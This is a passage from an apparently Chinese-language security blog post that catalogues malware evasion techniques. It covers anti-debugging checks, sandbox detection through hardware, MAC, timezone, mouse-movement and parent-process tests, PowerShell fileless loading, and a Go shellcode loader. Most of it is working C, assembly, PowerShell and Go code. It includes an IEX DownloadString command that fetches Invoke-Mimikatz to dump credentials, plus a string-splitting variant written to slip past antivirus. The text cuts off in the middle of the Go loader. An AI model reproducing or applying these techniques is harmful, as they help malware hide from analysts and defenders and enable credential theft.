</span><br><span class="line">return ret;  </span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">NtQueryInformationProcess</span><br><span class="line"></span><br><span class="line">这个函数用来获取某进程的信息。</span><br><span class="line">需要动态链接库 #pragma comment(lib,&quot;ntdll&quot;)</span><br><span class="line">当然也可以用GetProcAddress动态获取这个函数。</span><br><span class="line">这个函数第一个参数指定进程句柄，第二个参数指定进程的特定结构，第三个参数获取返回值，第四个参数是返回值缓冲区大小，第五个填NULL</span><br><span class="line">其中与反调试有关的成员有ProcessDebugPort(0x7)、ProcessDebugObjectHandle(0x1E)和ProcessDebugFlags(0x1F)</span><br><span class="line">ProcessDebugPort参数，若没在调试中，则该函数返回0，若在调试中则返回对应的调试端口</span><br><span class="line">其他参数也类似</span><br><span class="line"></span><br><span class="line">看雪上houjingyi师傅的演示代码</span><br><span class="line"></span><br><span class="line">BOOL CheckDebug()  </span><br><span class="line">&#123;  </span><br><span class="line">    int debugPort &#x3D; 0;  </span><br><span class="line">    HMODULE hModule &#x3D; LoadLibrary(&quot;Ntdll.dll&quot;);  </span><br><span class="line">    NtQueryInformationProcessPtr NtQueryInformationProcess &#x3D; (NtQueryInformationProcessPtr)GetProcAddress(hModule, &quot;NtQueryInformationProcess&quot;);  </span><br><span class="line">    NtQueryInformationProcess(GetCurrentProcess(), 0x7, &amp;debugPort, sizeof(debugPort), NULL);  </span><br><span class="line">    return debugPort !&#x3D; 0;  </span><br><span class="line">&#125;  </span><br><span class="line">   </span><br><span class="line">BOOL CheckDebug()  </span><br><span class="line">&#123;  </span><br><span class="line">    HANDLE hdebugObject &#x3D; NULL;  </span><br><span class="line">    HMODULE hModule &#x3D; LoadLibrary(&quot;Ntdll.dll&quot;);  </span><br><span class="line">    NtQueryInformationProcessPtr NtQueryInformationProcess &#x3D; (NtQueryInformationProcessPtr)GetProcAddress(hModule, &quot;NtQueryInformationProcess&quot;);  </span><br><span class="line">    NtQueryInformationProcess(GetCurrentProcess(), 0x1E, &amp;hdebugObject, sizeof(hdebugObject), NULL);  </span><br><span class="line">    return hdebugObject !&#x3D; NULL;  </span><br><span class="line">&#125;  </span><br><span class="line">   </span><br><span class="line">BOOL CheckDebug()  </span><br><span class="line">&#123;  </span><br><span class="line">    BOOL bdebugFlag &#x3D; TRUE;  </span><br><span class="line">    HMODULE hModule &#x3D; LoadLibrary(&quot;Ntdll.dll&quot;);  </span><br><span class="line">    NtQueryInformationProcessPtr NtQueryInformationProcess &#x3D; (NtQueryInformationProcessPtr)GetProcAddress(hModule, &quot;NtQueryInformationProcess&quot;);  </span><br><span class="line">    NtQueryInformationProcess(GetCurrentProcess(), 0x1E, &amp;bdebugFlag, sizeof(bdebugFlag), NULL);  </span><br><span class="line">    return bdebugFlag !&#x3D; TRUE;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><h5 id="检测软件断点"><a href="#检测软件断点" class="headerlink" title="检测软件断点"></a>检测软件断点</h5><p>当我们在调试器中对一行代码打上断点时，实质上是将这行代码改为了0xcc，即INT 3，中断异常，所以调试器运行到此处时会停止。<br>那么我们就可以通过检测代码中是否有0xcc来判断是否被打上了软件断点，从而起到反调试的作用。</p><p>要做到这一点，可以使用汇编代码中的 repne scasb 指令，其第一个参数是缓冲区的起始地址，第二个参数是缓冲区大小，第三个参数是匹配的字符串。它会在指定的缓冲区内寻找字符串，若没有找到则返回.</p><h5 id="时间检测"><a href="#时间检测" class="headerlink" title="时间检测"></a>时间检测</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int t1 &#x3D; GetTickCount64();</span><br><span class="line">Hack(); &#x2F;&#x2F;一个函数，诱导分析人员在调试的时候跟进进去耽误时间</span><br><span class="line">int t2 &#x3D; GetTickCount64();</span><br><span class="line">if (((t2 - t1) &#x2F; 1000) &gt; 5) &#123;</span><br><span class="line">return FALSE;</span><br><span class="line">&#125;  &#x2F;&#x2F;t1,t2检测时间过大则会是调试</span><br><span class="line"></span><br><span class="line">wprintf_s(L&quot;Now hacking more...\n&quot;);</span><br><span class="line"></span><br><span class="line">也可以用内联汇编完成</span><br><span class="line">BOOL CheckDebug()  </span><br><span class="line">&#123;  </span><br><span class="line">    DWORD time1, time2;  </span><br><span class="line">    __asm  </span><br><span class="line">    &#123;  </span><br><span class="line">        rdtsc  </span><br><span class="line">        mov time1, eax</span><br><span class="line">        ........垃圾代码，耽误分析人员时间</span><br><span class="line">        rdtsc  </span><br><span class="line">        mov time2, eax  </span><br><span class="line">    &#125;  </span><br><span class="line">    if (time2 - time1 &lt; 0xff)  </span><br><span class="line">    &#123;  </span><br><span class="line">        return FALSE;  </span><br><span class="line">    &#125;  </span><br><span class="line">    else  </span><br><span class="line">    &#123;  </span><br><span class="line">        return TRUE;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><h5 id="检测父进程"><a href="#检测父进程" class="headerlink" title="检测父进程"></a>检测父进程</h5><p>见沙箱绕过章节中的“检测父进程”</p><h5 id="SEH中断"><a href="#SEH中断" class="headerlink" title="SEH中断"></a>SEH中断</h5><p>不是很懂</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void AD_BreakPoint()  </span><br><span class="line">&#123;  </span><br><span class="line">    printf(&quot;SEH : BreakPoint\n&quot;);  </span><br><span class="line">   </span><br><span class="line">    __asm &#123;  </span><br><span class="line">        &#x2F;&#x2F; install SEH  </span><br><span class="line">        push handler  </span><br><span class="line">        push DWORD ptr fs:[0]  </span><br><span class="line">        mov DWORD ptr fs:[0], esp  </span><br><span class="line">           </span><br><span class="line">        &#x2F;&#x2F; generating exception  </span><br><span class="line">        int 3  </span><br><span class="line">   </span><br><span class="line">        &#x2F;&#x2F; 1) debugging  </span><br><span class="line">        &#x2F;&#x2F;    go to terminating code  </span><br><span class="line">        mov eax, 0xFFFFFFFF  </span><br><span class="line">        jmp eax                 &#x2F;&#x2F; process terminating!!!  </span><br><span class="line">   </span><br><span class="line">        &#x2F;&#x2F; 2) not debugging  </span><br><span class="line">        &#x2F;&#x2F;    go to normal code  </span><br><span class="line">handler:  </span><br><span class="line">        mov eax, dword ptr ss:[esp+0xc]  </span><br><span class="line">        mov ebx, normal_code  </span><br><span class="line">        mov dword ptr ds:[eax+0xb8], ebx  </span><br><span class="line">        xor eax, eax  </span><br><span class="line">        retn  </span><br><span class="line">   </span><br><span class="line">normal_code:  </span><br><span class="line">        &#x2F;&#x2F;   remove SEH  </span><br><span class="line">        pop dword ptr fs:[0]  </span><br><span class="line">        add esp, 4  </span><br><span class="line">    &#125;  </span><br><span class="line">   </span><br><span class="line">    printf(&quot;  &#x3D;&gt; Not debugging...\n\n&quot;);  </span><br><span class="line">&#125;  </span><br><span class="line">   </span><br><span class="line">int _tmain(int argc, TCHAR* argv[])  </span><br><span class="line">&#123;  </span><br><span class="line">    AD_BreakPoint();  </span><br><span class="line">   </span><br><span class="line">    return 0;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="沙箱绕过（Sandbox-Evasion）"><a href="#沙箱绕过（Sandbox-Evasion）" class="headerlink" title="沙箱绕过（Sandbox Evasion）"></a>沙箱绕过（Sandbox Evasion）</h3><h4 id="System-Checks"><a href="#System-Checks" class="headerlink" title="System Checks"></a>System Checks</h4><p>检测当前环境是否是沙箱环境，如果是沙箱则不表现出恶意行为。</p><h5 id="检测函数是否被HOOK更改"><a href="#检测函数是否被HOOK更改" class="headerlink" title="检测函数是否被HOOK更改"></a>检测函数是否被HOOK更改</h5><p>有些沙箱会对一些函数进行HOOK更改，我们可以通过在原DLL中查找原函数与进程中的函数进行比对从而判断其是否被HOOK.<br>这里是别人的代码(RedTeaming)</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; manually load the dll</span><br><span class="line">HANDLE dllFile &#x3D; CreateFileW(L&quot;C:\\Windows\\System32\\ntdll.dll&quot;, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);</span><br><span class="line">DWORD dllFileSize &#x3D; GetFileSize(dllFile, NULL);</span><br><span class="line">HANDLE hDllFileMapping &#x3D; CreateFileMappingW(dllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);</span><br><span class="line">HANDLE pDllFileMappingBase &#x3D; MapViewOfFile(hDllFileMapping, FILE_MAP_READ, 0, 0, 0);</span><br><span class="line">CloseHandle(dllFile);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; analyze the dll</span><br><span class="line">PIMAGE_DOS_HEADER pDosHeader &#x3D; (PIMAGE_DOS_HEADER)pDllFileMappingBase;</span><br><span class="line">PIMAGE_NT_HEADERS pNtHeader &#x3D; (PIMAGE_NT_HEADERS)((PBYTE)pDllFileMappingBase + pDosHeader-&gt;e_lfanew);</span><br><span class="line">PIMAGE_OPTIONAL_HEADER pOptionalHeader &#x3D; (PIMAGE_OPTIONAL_HEADER)&amp;(pNtHeader-&gt;OptionalHeader);</span><br><span class="line">PIMAGE_EXPORT_DIRECTORY pExportDirectory &#x3D; (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pDllFileMappingBase + pOptionalHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);</span><br><span class="line">PULONG pAddressOfFunctions &#x3D; (PULONG)((PBYTE)pDllFileMappingBase + pExportDirectory-&gt;AddressOfFunctions);</span><br><span class="line">PULONG pAddressOfNames &#x3D; (PULONG)((PBYTE)pDllFileMappingBase + pExportDirectory-&gt;AddressOfNames);</span><br><span class="line">PUSHORT pAddressOfNameOrdinals &#x3D; (PUSHORT)((PBYTE)pDllFileMappingBase + pExportDirectory-&gt;AddressOfNameOrdinals);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; find the original function code</span><br><span class="line">PVOID pNtCreateThreadExOriginal &#x3D; NULL;</span><br><span class="line">for (int i &#x3D; 0; i &lt; pExportDirectory-&gt;NumberOfNames; ++i)</span><br><span class="line">&#123;</span><br><span class="line">PCSTR pFunctionName &#x3D; (PSTR)((PBYTE)pDllFileMappingBase + pAddressOfNames[i]);</span><br><span class="line">if (!strcmp(pFunctionName, &quot;NtCreateThreadEx&quot;))</span><br><span class="line">&#123;</span><br><span class="line">pNtCreateThreadExOriginal &#x3D; (PVOID)((PBYTE)pDllFileMappingBase + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; compare functions</span><br><span class="line">PVOID pNtCreateThreadEx &#x3D; GetProcAddress(GetModuleHandleW(L&quot;ntdll.dll&quot;), &quot;NtCreateThreadEx&quot;);</span><br><span class="line">if (memcmp(pNtCreateThreadEx, pNtCreateThreadExOriginal, 16)) return false;</span><br></pre></td></tr></table></figure><h5 id="GetTickCount"><a href="#GetTickCount" class="headerlink" title="GetTickCount"></a>GetTickCount</h5><p>GetTickCount 是win32 API之一，用来记录电脑开机后的运行时间（以毫秒为单位）<br>我们可以通过这个函数检测当前环境的运行时间，如果时间很短那么就有可能是沙箱。</p><p>为什么时间很短就可能是沙箱环境呢？沙箱对恶意程序的检测流程大致如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.启动虚拟环境</span><br><span class="line">2.将恶意程序复制进虚拟环境</span><br><span class="line">3.运行恶意程序一段时间（一般为5分钟）</span><br><span class="line">4.获取虚拟环境返回的报告</span><br><span class="line">5.关机</span><br></pre></td></tr></table></figure><p>全程不过6.7分钟，而正常的机器运行时间肯定是大于这个值的。那么我们就可以定一个标准：如果GetTickCount返回的值小于10min，那么就被判为沙箱环境。</p><h5 id="CPU-RAM等信息"><a href="#CPU-RAM等信息" class="headerlink" title="CPU,RAM等信息"></a>CPU,RAM等信息</h5><p>沙箱的CPUI多为1核，ram多小于2g，硬盘大小多小于100g。我们可以以此为一个基准进行沙箱检测。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;cpu processors</span><br><span class="line">SYSTEM_INFO systeminfo;</span><br><span class="line">GetSystemInfo(&amp;systeminfo);</span><br><span class="line">DWORD numberOfProcessors &#x3D; systeminfo.dwNumberOfProcessors;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;ram</span><br><span class="line">MEMORYSTATUSEX memoryStatus;</span><br><span class="line">memoryStatus.dwLength &#x3D; sizeof(memoryStatus);</span><br><span class="line">GlobalMemoryStatusEx(&amp;memoryStatus);</span><br><span class="line">DWORD RAMMB &#x3D; memoryStatus.ullTotalPhys &#x2F; 1024 &#x2F; 1024;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;hdd(硬盘大小)</span><br><span class="line">HANDLE hDevice &#x3D; CreateFileW(L&quot;\\\\.\\PhysicalDrive0&quot;, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);</span><br><span class="line">DISK_GEOMETRY pDiskGeometry;</span><br><span class="line">DWORD bytesReturned;</span><br><span class="line">DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &amp;pDiskGeometry, sizeof(pDiskGeometry), &amp;bytesReturned, (LPOVERLAPPED)NULL);</span><br><span class="line">DWORD diskSizeGB;</span><br><span class="line">diskSizeGB &#x3D; pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector &#x2F; 1024 &#x2F; 1024 &#x2F; 1024;</span><br><span class="line"></span><br><span class="line">printf(&quot;cpu:%d,ram:%d,size(gb):%d&quot;, numberOfProcessors, RAMMB, diskSizeGB);</span><br></pre></td></tr></table></figure><h5 id="mac"><a href="#mac" class="headerlink" title="mac"></a>mac</h5><p>常见虚拟机如vmware，viturl box等都有特殊的mac地址，可以以此为依据判断是否在虚拟机中（随着虚拟化主机越来越普遍，许多公司将业务系统也搬进了虚拟机，这个方法已不太能作为检测沙箱的指标）</p><p>“通常，MAC地址的前三个字节标识一个提供商。以00:05:69、00:0c:29和00:50:56开始的MAC地址与VMware相对应；以00:03:ff开始的MAC地址与virtualpc对应；以08:00:27开始的MAC地址与virtualbox对应。”</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">string mac;</span><br><span class="line">    get_3part_mac(mac);</span><br><span class="line">    if (mac &#x3D;&#x3D; &quot;00-05-69&quot; || mac &#x3D;&#x3D; &quot;00-0c-29&quot; || mac &#x3D;&#x3D; &quot;00-50-56&quot; || mac &#x3D;&#x3D; &quot;00-03-ff&quot; || mac &#x3D;&#x3D; &quot;08-00-27&quot;) &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">void get_3part_mac(string &amp;mac)  </span><br><span class="line">&#123;  </span><br><span class="line">    NCB Ncb;  </span><br><span class="line">    ASTAT Adapter;  </span><br><span class="line">    UCHAR uRetCode;  </span><br><span class="line">    LANA_ENUM lenum;  </span><br><span class="line">    memset(&amp;Ncb, 0, sizeof(Ncb));  </span><br><span class="line">    Ncb.ncb_command &#x3D; NCBENUM;  </span><br><span class="line">    Ncb.ncb_buffer &#x3D; (UCHAR *)&amp;lenum;  </span><br><span class="line">    Ncb.ncb_length &#x3D; sizeof(lenum);  </span><br><span class="line">    uRetCode &#x3D; Netbios(&amp;Ncb);  </span><br><span class="line">    for (int i &#x3D; 0; i &lt; lenum.length; i++)  </span><br><span class="line">    &#123;  </span><br><span class="line">        memset(&amp;Ncb, 0, sizeof(Ncb));  </span><br><span class="line">        Ncb.ncb_command &#x3D; NCBRESET;  </span><br><span class="line">        Ncb.ncb_lana_num &#x3D; lenum.lana[i];  </span><br><span class="line">        uRetCode &#x3D; Netbios(&amp;Ncb);  </span><br><span class="line">        memset(&amp;Ncb, 0, sizeof(Ncb));  </span><br><span class="line">        Ncb.ncb_command &#x3D; NCBASTAT;  </span><br><span class="line">        Ncb.ncb_lana_num &#x3D; lenum.lana[i];  </span><br><span class="line">        strcpy((char *)Ncb.ncb_callname, &quot;*&quot;);  </span><br><span class="line">        Ncb.ncb_buffer &#x3D; (unsigned char *)&amp;Adapter;  </span><br><span class="line">        Ncb.ncb_length &#x3D; sizeof(Adapter);  </span><br><span class="line">        uRetCode &#x3D; Netbios(&amp;Ncb);  </span><br><span class="line">        if (uRetCode &#x3D;&#x3D; 0)  </span><br><span class="line">        &#123;  </span><br><span class="line">            char tmp[128];  </span><br><span class="line">            sprintf(tmp, &quot;%02x-%02x-%02x&quot;,  </span><br><span class="line">                Adapter.adapt.adapter_address[0],  </span><br><span class="line">                Adapter.adapt.adapter_address[1],  </span><br><span class="line">                Adapter.adapt.adapter_address[2]  </span><br><span class="line">            );  </span><br><span class="line">            mac &#x3D; tmp;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><h5 id="分辨率"><a href="#分辨率" class="headerlink" title="分辨率"></a>分辨率</h5><p>沙箱的分辨率都不太正常</p><h5 id="检查时区与时间流动性"><a href="#检查时区与时间流动性" class="headerlink" title="检查时区与时间流动性"></a>检查时区与时间流动性</h5><p>沙箱往往会加速运行文件，故可以检查时间流动性是否正常从而检测沙箱</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    &#x2F;&#x2F;时区</span><br><span class="line">    DYNAMIC_TIME_ZONE_INFORMATION DynamicTimeZoneInfo;</span><br><span class="line">    GetDynamicTimeZoneInformation(&amp;DynamicTimeZoneInfo);</span><br><span class="line">    wchar_t wcTimeZoneName[128 + 1];</span><br><span class="line">    StringCchCopyW(wcTimeZoneName, 128, DynamicTimeZoneInfo.TimeZoneKeyName);</span><br><span class="line">    CharUpperW(wcTimeZoneName);</span><br><span class="line">    if (!wcsstr(wcTimeZoneName, L&quot;CHINA STANDARD TIME&quot;)) &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F;流动性</span><br><span class="line">    clock_t ClockStartTime, ClockEndTime;</span><br><span class="line">    time_t UnixStartTime &#x3D; time(0);</span><br><span class="line">    ClockStartTime &#x3D; clock();</span><br><span class="line">    Sleep(10000);</span><br><span class="line">    ClockEndTime &#x3D; clock();</span><br><span class="line">    time_t UnixEndTime &#x3D; time(0);</span><br><span class="line">    int iTimeDifference &#x3D; ((UnixEndTime - UnixStartTime) * 1000) - (ClockEndTime - ClockStartTime);</span><br><span class="line">    if (iTimeDifference&gt;150)&#123;</span><br><span class="line">&#x2F;&#x2F;*code</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h5 id="检测文件名是否被沙箱更改"><a href="#检测文件名是否被沙箱更改" class="headerlink" title="检测文件名是否被沙箱更改"></a>检测文件名是否被沙箱更改</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wchar_t currentProcessPath[MAX_PATH + 1];</span><br><span class="line">GetModuleFileNameW(NULL, currentProcessPath, MAX_PATH + 1);</span><br><span class="line">CharUpperW(currentProcessPath);</span><br><span class="line">if (!wcsstr(currentProcessPath, L&quot;evil.EXE&quot;)) return false;</span><br></pre></td></tr></table></figure><h4 id="Time-Based-Evasion"><a href="#Time-Based-Evasion" class="headerlink" title="Time-Based Evasion"></a>Time-Based Evasion</h4><p>基于时间的规避。即恶意软件在目标系统上运行后并不会立刻进行恶意行动，而是会伪装、休眠一段时间，等到一定时间后再开始恶意行动</p><h5 id="使用网络连接实时读取启动指令"><a href="#使用网络连接实时读取启动指令" class="headerlink" title="使用网络连接实时读取启动指令"></a>使用网络连接实时读取启动指令</h5><p>意思就是说该程序会不断向某个网址发送请求包，如果网址返回了对应的启动指令则开始调用恶意代码。</p><p>下图是用HTTP请求获取网页内容的代码。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HINTERNET hSession &#x3D; WinHttpOpen(L&quot;Mozilla 5.0&quot;, WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);</span><br><span class="line">HINTERNET hConnection &#x3D; WinHttpConnect(hSession, L&quot;www.baidu.com&quot;, INTERNET_DEFAULT_HTTP_PORT, 0);</span><br><span class="line">HINTERNET hRequest &#x3D; WinHttpOpenRequest(hConnection, L&quot;GET&quot;, L&quot;&quot;, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, NULL);</span><br><span class="line">WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);</span><br><span class="line">WinHttpReceiveResponse(hRequest, 0);</span><br><span class="line">DWORD responseLength;</span><br><span class="line">WinHttpQueryDataAvailable(hRequest, &amp;responseLength);</span><br><span class="line">PVOID response &#x3D; new char[responseLength + 1];</span><br><span class="line">WinHttpReadData(hRequest, response, responseLength, &amp;responseLength);</span><br><span class="line">std::cout &lt;&lt; ((char *)response);</span><br></pre></td></tr></table></figure><h4 id="User-Activity-Based-Checks"><a href="#User-Activity-Based-Checks" class="headerlink" title="User Activity Based Checks"></a>User Activity Based Checks</h4><p>通过检测一些行为，来识别当前实施者是否为人类。（比如动鼠标，敲键盘等，或者查询电脑上word文档打开历史数，chrome历史记录等信息来判断）</p><h5 id="鼠标移动轨迹"><a href="#鼠标移动轨迹" class="headerlink" title="鼠标移动轨迹"></a>鼠标移动轨迹</h5><p>可以设置鼠标移动多少距离才执行shellcode，沙箱有些是没有鼠标的。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POINT CurrentMousePos;</span><br><span class="line">    POINT PreviousMousePos;</span><br><span class="line">    GetCursorPos(&amp;PreviousMousePos);</span><br><span class="line">    double Dis &#x3D; 0;</span><br><span class="line">    while (true)</span><br><span class="line">    &#123;</span><br><span class="line">        GetCursorPos(&amp;CurrentMousePos);</span><br><span class="line">        Dis+&#x3D; sqrt(pow(CurrentMousePos.x - PreviousMousePos.x, 2) + pow(CurrentMousePos.y - PreviousMousePos.y, 2));</span><br><span class="line">        Sleep(100);</span><br><span class="line">        if (Dis &gt; 20000) &#123;</span><br><span class="line">&#x2F;&#x2F;*code</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h5 id="检测父进程-1"><a href="#检测父进程-1" class="headerlink" title="检测父进程"></a>检测父进程</h5><p>对于一个正常的用户来说，启动exe文件应该是双击运行，程序启动后父进程是explore.exe，如果是cmd运行则会是cmd.exe、<br>但是对于沙箱就有可能存在用一个程序如windbg来启动我们的恶意EXE文件，这个时候我们就需要对此点进行检测。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DWORD GetParentPID(DWORD pid)</span><br><span class="line">&#123;</span><br><span class="line">DWORD ppid &#x3D; 0;</span><br><span class="line">PROCESSENTRY32W processEntry &#x3D; &#123; 0 &#125;;</span><br><span class="line">processEntry.dwSize &#x3D; sizeof(PROCESSENTRY32W);</span><br><span class="line">HANDLE hSnapshot &#x3D; CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);  &#x2F;&#x2F;对所有进程创建快照</span><br><span class="line">if (Process32FirstW(hSnapshot, &amp;processEntry))  &#x2F;&#x2F;遍历快照，找到当前传入PID的进程信息</span><br><span class="line">&#123;</span><br><span class="line">do</span><br><span class="line">&#123;</span><br><span class="line">if (processEntry.th32ProcessID &#x3D;&#x3D; pid)</span><br><span class="line">&#123;</span><br><span class="line">ppid &#x3D; processEntry.th32ParentProcessID;  &#x2F;&#x2F;找到并返回传入PID的父进程PID</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">&#125; while (Process32NextW(hSnapshot, &amp;processEntry));</span><br><span class="line">&#125;</span><br><span class="line">CloseHandle(hSnapshot);</span><br><span class="line">return ppid;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">DWORD parentPid &#x3D; GetParentPID(GetCurrentProcessId()); &#x2F;&#x2F;获取当前进程父进程PID</span><br><span class="line">WCHAR parentName[MAX_PATH + 1];</span><br><span class="line">DWORD dwParentName &#x3D; MAX_PATH;</span><br><span class="line">HANDLE hParent &#x3D; OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, parentPid);  &#x2F;&#x2F;打开父进程</span><br><span class="line">QueryFullProcessImageNameW(hParent, 0, parentName, &amp;dwParentName); &#x2F;&#x2F; another way to get process name is to use &#39;Toolhelp32Snapshot&#39; &#x2F;&#x2F;获取进程名</span><br><span class="line">CharUpperW(parentName);</span><br><span class="line">if (wcsstr(parentName, L&quot;WINDBG.EXE&quot;)) return; &#x2F;&#x2F;匹配</span><br><span class="line"></span><br><span class="line">wprintf_s(L&quot;Now hacking...\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="进程镂空"><a href="#进程镂空" class="headerlink" title="进程镂空"></a>进程镂空</h3><h3 id="动态调用API"><a href="#动态调用API" class="headerlink" title="动态调用API"></a>动态调用API</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void* ntAllocateVirtualMemory &#x3D; GetProcAddress(LoadLibraryA(&quot;ntdll.dll&quot;), &quot;NtAllocateVirtualMemory&quot;);</span><br></pre></td></tr></table></figure><h1 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h1><h3 id="远程执行与本地执行"><a href="#远程执行与本地执行" class="headerlink" title="远程执行与本地执行"></a>远程执行与本地执行</h3><h4 id="远程执行"><a href="#远程执行" class="headerlink" title="远程执行"></a>远程执行</h4><p>powershell可以加载远程的ps1文件。这样做的好处是实现了无文件落地。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz -DumpCreds&quot;</span><br></pre></td></tr></table></figure><p>不过市面上很多杀软对downloadstring检测十分十分严格(许多会检测远程文件安全性）</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell -exec bypass -f \\webdavserver\folder\payload.ps1 (smb)</span><br></pre></td></tr></table></figure><h4 id="本地执行"><a href="#本地执行" class="headerlink" title="本地执行"></a>本地执行</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell Import-Module .\xx.ps1</span><br></pre></td></tr></table></figure><h3 id="命令拆分"><a href="#命令拆分" class="headerlink" title="命令拆分"></a>命令拆分</h3><p>就像刚刚远程加载的downloadstring法，它很容易被杀软拦截。但是我们可以通过拆分重组绕过一些杀软检测。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell -c &quot;$c1&#x3D;&#39;IEX(New-Object Net.WebClient).Downlo&#39;;$c2&#x3D;&#39;123(&#39;&#39;http:&#x2F;&#x2F;webserver&#x2F;xxx.ps1&#39;&#39;)&#39;.Replace(&#39;123&#39;,&#39;adString&#39;);IEX ($c1+$c2)&quot;</span><br></pre></td></tr></table></figure><h1 id="GO"><a href="#GO" class="headerlink" title="GO"></a>GO</h1><h2 id="FUNNY"><a href="#FUNNY" class="headerlink" title="FUNNY"></a>FUNNY</h2><p>很有趣的一件事是，用go语言写个helloworld传到vt被14家杀,牛批</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210819215802696.png" alt="image-20210819215802696"></p><h2 id="生成EXE"><a href="#生成EXE" class="headerlink" title="生成EXE"></a>生成EXE</h2><p>go 编译为EXE 的做法是<strong>go build</strong> ….go，但这样EXE打开时会有个黑框</p><p>go build -ldflags “-H windowsgui” ..go  生成无窗口EXE，但这样会增加杀软的查杀度</p><h2 id="申请内存加载shellcode"><a href="#申请内存加载shellcode" class="headerlink" title="申请内存加载shellcode"></a>申请内存加载shellcode</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">&quot;syscall&quot;</span><br><span class="line">&quot;unsafe&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">const (</span><br><span class="line">MEM_COMMIT             &#x3D; 0x1000</span><br><span class="line">MEM_RESERVE            &#x3D; 0x2000</span><br><span class="line">PAGE_EXECUTE_READWRITE &#x3D; 0x40 &#x2F;&#x2F; 区域可以执行代码，应用程序可以读写该区域。</span><br><span class="line">KEY_1                  &#x3D; 55</span><br><span class="line">KEY_2                  &#x3D; 66</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">var (</span><br><span class="line">kernel32      &#x3D; syscall.MustLoadDLL(&quot;kernel32.dll&quot;)</span><br><span class="line">ntdll         &#x3D; syscall.MustLoadDLL(&quot;ntdll.dll&quot;)</span><br><span class="line">VirtualAlloc  &#x3D; kernel32.MustFindProc(&quot;VirtualAlloc&quot;)</span><br><span class="line">RtlCopyMemory &#x3D; ntdll.MustFindProc(&quot;RtlCopyMemory&quot;)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main()&#123;</span><br><span class="line">shellcode:&#x3D;[]byte&#123;0xfc,...,0x30,0x00,0x19,0x69,0xa0,0x8d&#125;</span><br><span class="line">addr,_,err:&#x3D;VirtualAlloc.Call(0,uintptr(len(shellcode)),MEM_COMMIT, PAGE_EXECUTE_READWRITE )</span><br><span class="line">if err !&#x3D; nil &amp;&amp; err.Error() !&#x3D; &quot;The operation completed successfully.&quot; &#123;</span><br><span 